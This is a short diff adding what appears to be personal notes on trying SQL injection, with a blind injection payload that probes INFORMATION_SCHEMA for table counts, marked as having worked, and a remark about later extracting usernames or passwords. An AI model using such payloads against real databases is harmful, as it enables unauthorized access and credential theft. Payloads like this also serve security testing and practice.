@@ -1,0 +1,9 @@
+Trying SQLi:
+
+#Is there more than one table in the database(s) containing a e?
+' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '%e%')>1 AND ''='
+#OK
+
+#That's enough... But someday we can try to find a username or even a pass... Maybe...
+
+
